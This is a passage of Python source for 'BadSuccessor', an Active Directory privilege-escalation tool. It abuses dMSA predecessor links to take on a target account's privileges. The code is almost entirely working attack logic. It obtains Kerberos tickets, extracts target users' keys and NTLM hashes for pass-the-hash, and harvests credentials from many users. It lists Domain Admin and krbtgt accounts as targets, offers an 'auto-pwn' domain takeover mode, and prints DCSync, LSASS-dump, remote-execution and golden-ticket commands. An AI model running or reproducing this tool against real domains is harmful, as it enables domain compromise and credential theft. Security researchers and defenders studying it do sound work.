        """Perform the BadSuccessor attack by setting the predecessor link"""
        self.log(f"Performing BadSuccessor attack targeting: {target_user}", "CRITICAL")

        try:
            target_dn = self.get_user_dn(target_user)
            if not target_dn:
                return False

            self.log(f"Target DN: {target_dn}", "INFO")

            changes = {
                'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_dn])],
                'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]
            }

            self.log("Setting predecessor link and migration state...", "INFO")
            success = self.connection.modify(dmsa_dn, changes)

            if success:
                self.log("Successfully set predecessor link and migration state!", "CRITICAL")
                self.log(f"dMSA now inherits all privileges from: {target_user}", "CRITICAL")

                self.connection.search(
                    search_base=dmsa_dn,
                    search_filter='(objectClass=*)',
                    attributes=['msDS-ManagedAccountPrecededByLink', 'msDS-DelegatedMSAState', 'cn']
                )

                if self.connection.entries:
                    entry = self.connection.entries[0]
                    self.log("Attack verification:", "INFO")
                    if hasattr(entry, 'msDS-ManagedAccountPrecededByLink'):
                        self.log(f"  Predecessor link: {entry['msDS-ManagedAccountPrecededByLink']}", "SUCCESS")
                    if hasattr(entry, 'msDS-DelegatedMSAState'):
                        self.log(f"  Migration state: {entry['msDS-DelegatedMSAState']}", "SUCCESS")

                return True
            else:
                error = self.connection.result
                self.log(f"Failed to modify dMSA: {error}", "ERROR")
                return False

        except Exception as e:
            self.log(f"Error performing attack: {e}", "ERROR")
            return False

    def get_user_dn(self, username):
        """Get the distinguished name of a user"""
        try:
            if ',' in username and '=' in username:
                return username

            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'userAccountControl', 'memberOf', 'adminCount']
            )

            if self.connection.entries:
                user_entry = self.connection.entries[0]
                user_dn = str(user_entry.distinguishedName)

                uac = 0
                if hasattr(user_entry, 'userAccountControl') and user_entry.userAccountControl:
                    try:
                        uac_value = user_entry.userAccountControl
                        if uac_value and str(uac_value) != '[]':
                            uac = int(str(uac_value))
                    except:
                        pass

                self.log(f"Found target user DN: {user_dn}", "SUCCESS")

                if uac:
                    if uac & 0x00000002:
                        self.log("Note: Target account is disabled", "WARNING")
                    if uac & 0x10000000:
                        self.log("Note: Target is marked as Protected User", "WARNING")
                    if uac & 0x00080000:
                        self.log("Note: Target is marked as 'sensitive and cannot be delegated'", "WARNING")
                    if uac & 0x00020000:
                        self.log("Note: Target requires smartcard authentication", "WARNING")

                if hasattr(user_entry, 'adminCount') and str(user_entry.adminCount) == '1':
                    self.log("Note: Target has adminCount=1 (likely privileged)", "INFO")

                if hasattr(user_entry, 'memberOf') and user_entry.memberOf:
                    for group in user_entry.memberOf:
                        group_name = str(group).split(',')[0].split('=')[1]
                        if any(admin_group in group_name.lower() for admin_group in ['admin', 'operator']):
                            self.log(f"Note: Target is member of privileged group: {group_name}", "INFO")

                return user_dn
            else:
                self.log(f"User not found: {username}", "ERROR")
                return None

        except Exception as e:
            self.log(f"Error finding user: {e}", "ERROR")
            return None

    def authenticate_as_dmsa(self, dmsa_name):
        """Authenticate as the dMSA and retrieve TGT with inherited privileges"""
        self.log(f"Authenticating as dMSA: {dmsa_name}$", "INFO")

        try:
            tgt, session_key, key_package = self.kerberos_auth.get_dmsa_tgt_with_pac(
                dmsa_name, self.domain, self.dc_ip, extract_keys=True
            )

            if tgt:
                self.log("Successfully obtained TGT for dMSA!", "SUCCESS")
                self.log("The TGT PAC now contains:", "CRITICAL")
                self.log("  - All group memberships of the target user", "INFO")
                self.log("  - All permissions and rights of the target user", "INFO")
                self.log("  - Complete privilege inheritance via PAC", "CRITICAL")

                ccache_file = self._save_ticket_to_ccache(tgt, dmsa_name, session_key)

                if key_package and 'extraction_status' not in key_package and 'extraction_note' not in key_package:
                    self.log("\nExtracted keys from KERB-DMSA-KEY-PACKAGE:", "CRITICAL")

                    if key_package.get('current_keys'):
                        self.log("  Current keys (dMSA's keys):", "INFO")
                        for key in key_package['current_keys']:
                            self.log(f"    {key.get('type_name', 'Unknown')}: {key['value'][:32]}...", "INFO")

                    if key_package.get('previous_keys'):
                        self.log("  Previous keys (TARGET USER'S KEYS!):", "CRITICAL")
                        for key in key_package['previous_keys']:
                            self.log(f"    {key.get('type_name', 'Unknown')}: {key['value']}", "CRITICAL")

                            if key['type'] == 23:
                                self.log("    ^ This is the target's NTLM hash - can be used for pass-the-hash!", "CRITICAL")
                                self.log(f"    Use: impacket-psexec {self.domain}/{dmsa_name}$ -hashes :{key['value']} {self.dc_ip}", "INFO")

                return ccache_file
            else:
                self.log("Failed to obtain TGT", "ERROR")
                return None

        except Exception as e:
            self.log(f"Authentication error: {e}", "ERROR")
            return None

    def _save_ticket_to_ccache(self, tgt, dmsa_name, session_key):
        """Save Kerberos ticket to ccache file"""
        try:
            ccache_file = f"/tmp/{dmsa_name}_{int(time.time())}.ccache"

            ccache = CCache()
            ccache.fromTGT(tgt, session_key, session_key)

            with open(ccache_file, 'wb') as f:
                f.write(ccache.getData())

            self.log(f"Saved ticket to: {ccache_file}", "SUCCESS")
            os.chmod(ccache_file, 0o600)

            return ccache_file

        except Exception as e:
            self.log(f"Failed to save ticket: {e}", "WARNING")
            return None

    def perform_credential_extraction(self, target_users):
        """Extract credentials for multiple users using dMSA key package"""
        self.log("Performing mass credential extraction...", "CRITICAL")

        extracted_creds = {}

        for user in target_users:
            try:
                self.log(f"\nTargeting user: {user}", "INFO")

                temp_dmsa_name = f"extract_{user[:8]}_{uuid.uuid4().hex[:6]}"

                if not hasattr(self, 'writable_ou'):
                    writable_ous = self.enumerate_writable_ous()
                    if writable_ous:
                        self.writable_ou = writable_ous[0]['dn']
                    else:
                        self.log("No writable OU found", "ERROR")
                        continue

                dmsa_dn = self.create_dmsa_object(self.writable_ou, temp_dmsa_name)

                if dmsa_dn:
                    if self.perform_badsuccessor_attack(dmsa_dn, user):
                        ccache = self.authenticate_as_dmsa(temp_dmsa_name)

                        extracted_creds[user] = {
                            'dmsa': temp_dmsa_name,
                            'ccache': ccache,
                            'status': 'success'
                        }

                        self.log(f"Successfully extracted credentials for {user}", "SUCCESS")
                    else:
                        extracted_creds[user] = {'status': 'failed', 'reason': 'attack failed'}

                    self.cleanup_dmsa(dmsa_dn)
                else:
                    extracted_creds[user] = {'status': 'failed', 'reason': 'dmsa creation failed'}

            except Exception as e:
                self.log(f"Failed to extract creds for {user}: {e}", "ERROR")
                extracted_creds[user] = {'status': 'failed', 'reason': str(e)}

        self.log(f"\nCredential extraction summary:", "INFO")
        success_count = sum(1 for v in extracted_creds.values() if v.get('status') == 'success')
        self.log(f"  Successful: {success_count}/{len(target_users)}", "SUCCESS" if success_count > 0 else "WARNING")

        return extracted_creds

    def generate_post_exploitation_commands(self, dmsa_name, ccache_file):
        """Generate commands for post-exploitation"""
        self.log("\n" + "="*60, "INFO")
        self.log("POST-EXPLOITATION COMMANDS", "CRITICAL")
        self.log("="*60 + "\n", "INFO")

        self.log("1. Using the obtained TGT:", "INFO")
        self.log(f"   export KRB5CCNAME={ccache_file}", "INFO")
        self.log("   klist", "INFO")

        self.log("\n2. DCSync attack (dump all hashes):", "INFO")
        self.log(f"   impacket-secretsdump {self.domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -k -no-pass", "INFO")

        self.log("\n3. Remote command execution:", "INFO")
        self.log(f"   impacket-psexec {self.domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -k -no-pass", "INFO")
        self.log(f"   impacket-wmiexec {self.domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -k -no-pass", "INFO")

        self.log("\n4. Access domain controller:", "INFO")
        self.log(f"   impacket-smbclient {self.domain}/{dmsa_name}$@{self.dc_ip} -k -no-pass", "INFO")

        self.log("\n5. Dump LSASS remotely:", "INFO")
        self.log(f"   lsassy {self.domain}/{dmsa_name}$ -k {self.dc_ip}", "INFO")

        self.log("\n6. Golden ticket creation:", "INFO")
        self.log(f"   # First get krbtgt hash from DCSync", "INFO")
        self.log(f"   impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain {self.domain} Administrator", "INFO")

        self.log("\n7. Persistence via dMSA:", "INFO")
        self.log(f"   # The dMSA will persist with target's privileges until removed", "INFO")
        self.log(f"   # Can be used for long-term access", "INFO")

    def cleanup_dmsa(self, dmsa_dn):
        """Clean up the created dMSA"""
        self.log(f"Cleaning up dMSA: {dmsa_dn}")

        try:
            success = self.connection.delete(dmsa_dn)

            if success:
                self.log("Successfully cleaned up dMSA", "SUCCESS")
                return True
            else:
                self.log(f"Failed to clean up dMSA: {self.connection.result}", "WARNING")
                return False

        except Exception as e:
            self.log(f"Error cleaning up dMSA: {e}", "ERROR")
            return False

    def enumerate_high_value_targets(self):
        """Enumerate high-value targets for privilege escalation"""
        self.log("Enumerating high-value targets...")

        high_value_groups = [
            "Domain Admins",
            "Enterprise Admins",
            "Schema Admins",
            "Administrators",
            "Account Operators",
            "Backup Operators",
            "Print Operators",
            "Server Operators",
            "Domain Controllers",
            "Read-only Domain Controllers",
            "Group Policy Creator Owners",
            "Cryptographic Operators",
            "Certificate Service DCOM Access",
            "Key Admins",
            "Enterprise Key Admins"
        ]

        targets = {}

        for group in high_value_groups:
            try:
                search_filter = f"(&(objectClass=group)(cn={escape_filter_chars(group)}))"
                self.connection.search(
                    search_base=self.domain_dn,
                    search_filter=search_filter,
                    attributes=['member', 'distinguishedName']
                )

                if self.connection.entries:
                    group_entry = self.connection.entries[0]
                    members = []

                    if hasattr(group_entry, 'member') and group_entry.member:
                        for member_dn in group_entry.member:
                            member_search = f"(distinguishedName={escape_filter_chars(str(member_dn))})"
                            self.connection.search(
                                search_base=self.domain_dn,
                                search_filter=member_search,
                                attributes=['sAMAccountName', 'userAccountControl', 'objectClass']
                            )

                            if self.connection.entries:
                                member_entry = self.connection.entries[0]
                                username = str(member_entry.sAMAccountName) if hasattr(member_entry, 'sAMAccountName') else str(member_dn).split(',')[0].split('=')[1]

                                if hasattr(member_entry, 'userAccountControl'):
                                    try:
                                        uac = int(str(member_entry.userAccountControl))
                                        if not (uac & 0x0002):
                                            members.append(username)
                                    except:
                                        members.append(username)
                                else:
                                    members.append(username)

                    if members:
                        targets[group] = members
                        self.log(f"{group}: {len(members)} active members", "INFO")
                        for member in members[:3]:
                            self.log(f"  - {member}", "INFO")
                        if len(members) > 3:
                            self.log(f"  ... and {len(members)-3} more", "INFO")

            except Exception as e:
                self.log(f"Error enumerating {group}: {e}", "WARNING")

        targets["Built-in Accounts"] = ["Administrator", "krbtgt"]

        self.log("\nEnumerating service accounts...", "INFO")
        svc_filter = "(|(&(objectClass=user)(sAMAccountName=svc*))(& (objectClass=user)(sAMAccountName=srv*))(& (objectClass=user)(sAMAccountName=service*)))"
        self.connection.search(
            search_base=self.domain_dn,
            search_filter=svc_filter,
            attributes=['sAMAccountName', 'servicePrincipalName', 'userAccountControl']
        )

        service_accounts = []
        for entry in self.connection.entries:
            if hasattr(entry, 'servicePrincipalName') and entry.servicePrincipalName:
                username = str(entry.sAMAccountName)
                if hasattr(entry, 'userAccountControl'):
                    try:
                        uac = int(str(entry.userAccountControl))
                        if not (uac & 0x0002):
                            service_accounts.append(username)
                    except:
                        service_accounts.append(username)
                else:
                    service_accounts.append(username)

        if service_accounts:
            targets["Service Accounts"] = service_accounts
            self.log(f"Found {len(service_accounts)} active service accounts", "INFO")

        return targets

def main():
    parser = argparse.ArgumentParser(
        description="BadSuccessor - Enhanced dMSA Privilege Escalation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack against Administrator
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --attack --target Administrator

  # Enumerate writable OUs first
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate

  # Extract credentials for multiple users
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --extract-creds --targets Administrator,krbtgt,svc_sql

  # Full automated attack chain
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --auto-pwn

  # Enumerate high-value targets
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --list-targets
        """
    )

    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., domain.com)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')
    parser.add_argument('--ldaps', action='store_true', help='Force LDAPS (SSL) connection')

    parser.add_argument('--attack', action='store_true', help='Perform the BadSuccessor attack')
    parser.add_argument('--target', help='Target user to escalate to (e.g., Administrator)')
    parser.add_argument('--dmsa-name', help='Name for the malicious dMSA (auto-generated if not specified)')
    parser.add_argument('--ou-dn', help='Specific OU DN to use (auto-detect if not specified)')

    parser.add_argument('--extract-creds', action='store_true', help='Extract credentials using key package')
    parser.add_argument('--targets', help='Comma-separated list of users for credential extraction')
    parser.add_argument('--auto-pwn', action='store_true', help='Fully automated domain takeover')

    parser.add_argument('--enumerate', action='store_true', help='Enumerate writable OUs')
    parser.add_argument('--list-targets', action='store_true', help='List high-value targets')
    parser.add_argument('--check-schema', action='store_true', help='Verify Windows 2025 schema')

    parser.add_argument('--cleanup', action='store_true', help='Clean up created dMSA')
    parser.add_argument('--dmsa-dn', help='dMSA DN for cleanup')

    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    bs = BadSuccessor()

    if not args.no_banner:
        bs.print_banner()

    bs.domain = args.domain
    bs.username = args.username
    bs.password = args.password

    if args.dc_ip:
        bs.dc_ip = args.dc_ip
    else:
        bs.log("Discovering Domain Controller...", "INFO")
        bs.dc_ip, _ = bs.discover_domain_controller(args.domain)
        if not bs.dc_ip:
            bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
            sys.exit(1)

    bs.connection = bs.establish_ldap_connection(
        bs.dc_ip, args.domain, args.username, args.password,
        use_ssl=args.ldaps
    )

    if not bs.connection:
        bs.log("Failed to establish LDAP connection", "ERROR")
        sys.exit(1)

    bs.get_current_user_sid()
    bs.acl_checker = ACLPermissionChecker(bs.connection, bs.user_sid, bs.username)
    bs.kerberos_auth = KerberosAuthenticator(args.domain, bs.dc_ip)

    try:
        if args.check_schema:
            if not bs.check_windows_2025_schema():
                bs.log("Windows Server 2025 schema not detected. Attack may not work.", "WARNING")
                if not args.attack:
                    return

        if args.list_targets:
            targets = bs.enumerate_high_value_targets()
            bs.log(f"\nFound {sum(len(v) for v in targets.values())} total high-value targets", "SUCCESS")
            return

        if args.enumerate:
            writable_ous = bs.enumerate_writable_ous()
            if writable_ous:
                bs.log(f"\nFound {len(writable_ous)} locations with write permissions:", "SUCCESS")
                for ou in writable_ous:
                    bs.log(f"  - {ou['name']}", "INFO")
                    bs.log(f"    DN: {ou['dn']}", "INFO")
                    bs.log(f"    Permissions: {', '.join(ou['permissions'])}", "SUCCESS")
            else:
                bs.log("No writable OUs found", "WARNING")
            return

        if args.cleanup:
            if not args.dmsa_dn:
                bs.log("--dmsa-dn required for cleanup", "ERROR")
                return
            bs.cleanup_dmsa(args.dmsa_dn)
            return

        if args.extract_creds:
            if not args.targets:
                bs.log("--targets required for credential extraction", "ERROR")
                return

            writable_ous = bs.enumerate_writable_ous()
            if not writable_ous:
                bs.log("No writable OUs found for creating dMSAs", "ERROR")
                return

            best_ou = None
            for ou in writable_ous:
                if ou['can_create_dmsa']:
                    best_ou = ou
                    break

            if not best_ou:
                bs.log("No OU with dMSA creation permissions found", "ERROR")
                return

            bs.writable_ou = best_ou['dn']
            target_list = args.targets.split(',')

            bs.log(f"Extracting credentials for {len(target_list)} targets...", "CRITICAL")
            extracted = bs.perform_credential_extraction(target_list)

            success_count = sum(1 for v in extracted.values() if v.get('status') == 'success')
            bs.log(f"\nSuccessfully extracted credentials for {success_count} users", "CRITICAL")
            return

        if args.attack or args.auto_pwn:
            if not bs.check_windows_2025_schema():
                bs.log("Windows Server 2025 required. Aborting.", "ERROR")
                return

            if args.auto_pwn:
                bs.log("Starting automated domain takeover...", "CRITICAL")
                args.target = "Administrator"

            if not args.target:
                bs.log("--target required for attack", "ERROR")
                return

            if not args.dmsa_name:
                target_short = args.target[:8] if len(args.target) > 8 else args.target
                args.dmsa_name = f"bs_{target_short}_{int(time.time())}"
                bs.log(f"Generated dMSA name: {args.dmsa_name}", "INFO")

            target_ou = args.ou_dn
            if not target_ou:
                writable_ous = bs.enumerate_writable_ous()
                if not writable_ous:
                    bs.log("No writable OUs found. Cannot proceed.", "ERROR")
                    return

                best_ou = None
                for ou in writable_ous:
                    if ou['can_create_dmsa']:
                        best_ou = ou
                        break

                if not best_ou:
                    best_ou = writable_ous[0]

                target_ou = best_ou['dn']
                bs.log(f"Using OU: {target_ou}", "INFO")
                bs.log(f"Permissions: {', '.join(best_ou['permissions'])}", "INFO")

            bs.log("\n[Phase 1] Creating malicious dMSA...", "CRITICAL")
            dmsa_dn = bs.create_dmsa_object(target_ou, args.dmsa_name)
            if not dmsa_dn:
                return

            bs.log("\n[Phase 2] Performing BadSuccessor attack...", "CRITICAL")
            if not bs.perform_badsuccessor_attack(dmsa_dn, args.target):
                bs.log("Attack failed. Cleaning up...", "ERROR")
                bs.cleanup_dmsa(dmsa_dn)
                return

            bs.log("\n[Phase 3] Authenticating with inherited privileges...", "CRITICAL")
            ccache_file = bs.authenticate_as_dmsa(args.dmsa_name)

            bs.log("\n[Phase 4] Attack successful!", "CRITICAL")
            bs.generate_post_exploitation_commands(args.dmsa_name, ccache_file)

            bs.log(f"\nRemember to clean up: --cleanup --dmsa-dn \"{dmsa_dn}\"", "WARNING")

            if args.auto_pwn:
                bs.log("\n[Phase 5] Auto-pwn complete!", "CRITICAL")
                bs.log("You now have Domain Admin privileges via the dMSA", "CRITICAL")
                bs.log("Use the provided commands for post-exploitation", "INFO")

        else:
            parser.print_help()

    except KeyboardInterrupt:
        bs.log("\nOperation cancelled by user", "WARNING")
    except Exception as e:
        bs.log(f"Unexpected error: {e}", "ERROR")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        if bs.connection:
            bs.connection.unbind()

if __name__ == "__main__":
    main()
